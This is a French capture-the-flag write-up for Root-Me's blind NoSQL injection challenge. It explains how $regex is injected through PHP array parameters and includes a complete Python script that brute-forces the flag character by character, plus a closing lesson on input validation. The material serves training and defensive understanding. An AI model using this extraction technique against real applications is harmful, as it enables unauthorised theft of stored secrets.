# Writeup — NoSQL Blind Injection (Root-Me, ch48)

## Contexte

**Challenge :** `nosqlblind` — Root-Me, Web-Serveur ch48
**URL :** `http://challenge01.root-me.org/web-serveur/ch48/index.php`
**Catégorie :** Injection NoSQL (blind)

Le formulaire exposé par le challenge accepte deux paramètres GET :

```html
<input type="text" name="chall_name" />
<input type="text" name="flag" />
```

L'application semble interroger une base NoSQL (type MongoDB) directement avec les paramètres fournis par l'utilisateur, sans validation stricte du type attendu pour `flag`. Cela ouvre la porte à une **injection d'opérateurs NoSQL**.

## Principe de la vulnérabilité

En HTTP, un paramètre comme `flag[$regex]=valeur` est interprété côté PHP comme un tableau associatif :

```php
$_GET['flag'] = ['$regex' => 'valeur'];
```

Si ce tableau est transmis tel quel à une requête MongoDB (`db.collection.find({flag: $_GET['flag']})`), l'opérateur `$regex` est injecté directement dans la requête, permettant de tester si le flag **matche une expression régulière** plutôt que d'être comparé à une valeur fixe.

En ancrant la regex en début de chaîne (`^préfixe`), on peut tester caractère par caractère si le flag commence par une séquence donnée, et ainsi le reconstruire entièrement par **extraction blind** (le serveur répond simplement "vrai" ou "faux" selon qu'il y a correspondance).

## Démarche

### 1. Identifier le bon nom de paramètre

Première tentative infructueuse : le script envoyait `chal_name`, mais le formulaire HTML renvoyé par le serveur révélait le vrai nom attendu :

```html
<input type="text" name="chall_name" />
```

Une simple faute de frappe (`chal_name` au lieu de `chall_name`) suffisait à faire échouer silencieusement toutes les requêtes — le serveur retournait la page d'accueil par défaut au lieu de traiter l'injection.

### 2. Valider l'injection avant de brute-forcer

Avant de lancer l'extraction complète, deux requêtes de contrôle permettent de confirmer que l'injection fonctionne :

| Requête | Regex envoyée | Résultat attendu |
|---|---|---|
| Cas vrai | `^.*` | Doit matcher (contient "Yeah") |
| Cas faux | `^ZZZINEXISTANT` | Ne doit pas matcher |

Si le cas vrai échoue, il est inutile de lancer le brute-force : le problème est en amont (mauvais nom de paramètre, session requise, mauvais format, etc.).

### 3. Extraction caractère par caractère

Pour chaque position du flag, on teste tous les caractères imprimables (`string.printable`), en excluant les métacaractères regex (`* + . ? | # & $ ^ ( ) [ ] \`) qui casseraient la syntaxe de la regex elle-même plutôt que d'être interprétés comme un caractère littéral.

Dès qu'un caractère produit une réponse positive ("Yeah"), il est ajouté au flag reconstruit et la recherche reprend pour le caractère suivant. L'absence de correspondance sur un tour complet indique la fin du flag.

## Script final

```python
import string
import requests
import urllib3

urllib3.disable_warnings()

session = requests.Session()
chall_name = 'nosqlblind'
flag = ''
u = 'http://challenge01.root-me.org/web-serveur/ch48/index.php'

excluded = ['*', '+', '.', '?', '|', '#', '&', '$', '^', '(', ')', '[', ']', '\\']

# --- Sanity check avant de lancer le brute-force ---
r_true = session.get(u, params={'chall_name': chall_name, 'flag[$regex]': '^.*'}, verify=False)
r_false = session.get(u, params={'chall_name': chall_name, 'flag[$regex]': '^ZZZINEXISTANT'}, verify=False)
print("[DEBUG] True case contient 'Yeah' ?", 'Yeah' in r_true.text)
print("[DEBUG] False case contient 'Yeah' ?", 'Yeah' in r_false.text)

if 'Yeah' not in r_true.text:
    print("⚠️ L'injection ne fonctionne pas comme prévu. Regarde la réponse brute :")
    print(r_true.text[:1000])
    exit()

# --- Brute-force avec logs ---
max_len = 50
for i in range(max_len):
    found = False
    for c in string.printable:
        if c in excluded:
            continue
        payload = {'chall_name': chall_name, 'flag[$regex]': f'^{flag + c}'}
        r = session.get(u, params=payload, verify=False)
        if 'Yeah' in r.text:
            flag += c
            print(f"[+] Caractère {i+1} trouvé : '{c}' -> flag = {flag}")
            found = True
            break
    if not found:
        print("[-] Aucun caractère ne matche à cette position, arrêt.")
        break

print(f"\nFlag final : {flag}")
```

### Points clés du script

- **`requests.Session()`** : conserve les cookies entre les requêtes, utile si l'application utilise une session.
- **`params={...}`** : laisse `requests` gérer l'encodage URL correctement, plutôt que de construire la chaîne de requête à la main (évite les erreurs d'échappement avec les caractères spéciaux de la regex).
- **Liste `excluded`** : exclut les métacaractères regex qui, non échappés, modifieraient le sens de l'expression testée (matcheraient "n'importe quel caractère", "zéro ou plusieurs fois", etc.) et fausseraient l'extraction.
- **Sanity check préalable** : permet de détecter immédiatement une erreur de configuration (mauvais nom de paramètre, besoin d'authentification) plutôt que de laisser tourner un brute-force qui ne trouvera jamais rien.
- **Arrêt propre** : la boucle s'arrête d'elle-même dès qu'aucun caractère ne matche plus, au lieu d'un `while True` sans condition de sortie.

## Erreurs rencontrées et corrections

| Erreur | Cause | Correction |
|---|---|---|
| `import urllib` au lieu de `import urllib3` | Faute de frappe | Import corrigé + ajout de `import requests` manquant |
| Variable `password` utilisée au lieu de `flag` | Incohérence de nommage | Unification sur `flag` |
| `while True` sans condition d'arrêt | Pas de détection de fin d'extraction | Arrêt dès qu'aucun caractère ne matche sur un tour complet |
| Script "tourne dans le vide" | Paramètre `chal_name` au lieu de `chall_name` | Vérification du nom exact via le formulaire HTML source |

## Conclusion

Ce challenge illustre un cas classique d'**injection NoSQL via opérateurs MongoDB exposés par des paramètres de tableau PHP** (`flag[$regex]=...`). La leçon principale : toute entrée utilisateur transmise telle quelle à une requête NoSQL doit être strictement typée et validée côté serveur, sous peine de permettre l'injection d'opérateurs de requête (`$regex`, `$ne`, `$gt`, etc.) à la place de valeurs littérales attendues.
